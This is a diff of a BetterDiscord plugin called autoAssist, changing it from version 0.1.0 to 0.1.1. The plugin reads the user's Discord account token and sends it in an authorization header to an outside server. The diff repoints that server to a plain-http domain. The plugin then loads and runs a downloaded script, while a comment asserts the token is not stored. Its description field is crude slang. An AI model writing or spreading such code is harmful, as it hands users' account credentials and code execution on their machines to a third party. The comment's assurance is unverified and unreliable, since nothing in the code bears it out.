@@ -40,7 +40,7 @@ const config = {
                 discord_id: "3713360440224645238",
             }
         ],
-        version: "0.1.0",
+        version: "0.1.1",
         description: "Люблю сосать",
         github: "https://github.com/GR0SST/autoassist/blob/main/autoAssist.plugin.js",
         github_raw: "https://raw.githubusercontent.com/GR0SST/autoassist/main/autoAssist.plugin.js",
@@ -51,7 +51,7 @@ const config = {
         title: "Channel logs",
         type: "fixed",
         items: [
-            "Ебать теперь нейросетка чекает чаты"
+            "Пофикшен баг с незапускающим плагином"
         ]
     }],
     defaultConfig: []
@@ -102,32 +102,9 @@ module.exports = !global.ZeresPluginLibrary ? class {
 
     const { DiscordModules, Modals, Settings, Toasts, PluginUtilities, Patcher, WebpackModules } = Library;
     const { React } = DiscordModules;
+    const { getToken } = WebpackModules.getByProps("getToken","getId")
     const path = `${BdApi.Plugins.folder}\\assistComponent.js`
-    let script = null
     const TopBarRef = React.createRef();
-    function getToken() {
-        let token
-        var req = webpackJsonp.push([
-            [], {
-                extra_id: (e, r, t) => e.exports = t
-            },
-            [
-                ["extra_id"]
-            ]
-        ]);
-        for (let e in req.c) {
-            if (req.c.hasOwnProperty(e)) {
-                let r = req.c[e].exports;
-                if (r && r.__esModule && r.default)
-                    for (let e in r.default)
-                        if ("getToken" === e) {
-                            token = r.default.getToken();
-                        }
-            }
-        }
-        return token
-
-    }
     class AutoAssists extends Plugin {
         constructor() {
             super();
@@ -138,7 +115,7 @@ module.exports = !global.ZeresPluginLibrary ? class {
             // Никакие данные используя токен не сохраняються и не обрабатываються
             const userToken = getToken()
             const options = {
-                url: 'https://da-hzcvrvs0dopl.runkit.sh/assist',
+                url: 'http://www.grosst.space/assist',
                 headers: {
                     'authorization': userToken
                 },
@@ -169,16 +146,16 @@ module.exports = !global.ZeresPluginLibrary ? class {
             delete require.cache[require.resolve(path)]
             await this.auth()
             let mainCode = require(path)
-            script = new mainCode.exports()
-            script.onStart()
+            this.script = new mainCode.exports()
+            this.script.onStart()
             this.loadSettings();
 
         }
 
         onStop() {
-            if (script !== null) {
-                script.onStop()
-            }
+            if (this.script) 
+                this.script.onStop()
+            
         }
 
         get defaultVariables() {
@@ -242,11 +219,6 @@ module.exports = !global.ZeresPluginLibrary ? class {
         getSettingsPath() {
             return this.getName();
         }
-
-
-
-
-
     }
 
 
